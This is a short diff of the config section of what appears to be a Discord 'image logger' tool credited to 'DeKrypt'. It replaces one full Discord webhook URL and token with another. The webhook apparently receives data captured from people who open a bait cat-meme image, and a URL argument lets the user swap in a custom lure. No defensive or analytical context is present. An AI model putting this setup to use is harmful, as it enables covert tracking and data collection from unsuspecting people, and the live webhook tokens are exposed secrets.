@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1482328311668408320/6IdJz-FDUYaF_wIqUv0FM_xq7I3ZGoxspzzSm4krFLCbXT6zhp_uOF-ogBrZNX5xJdPR",
+    "webhook": "https://discord.com/api/webhooks/1482359054092337437/Xn-4KnDn2GbSqHcQ_ijS_dnHWjugs17ItrgsQ1jrYtnXlFCc8xDQqsHZ8qLQXlktKfc9",
     "image": "https://www.citypng.com/public/uploads/preview/funny-ginger-memes-cat-transparent-png-735811696684715rzr8agw7dy.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
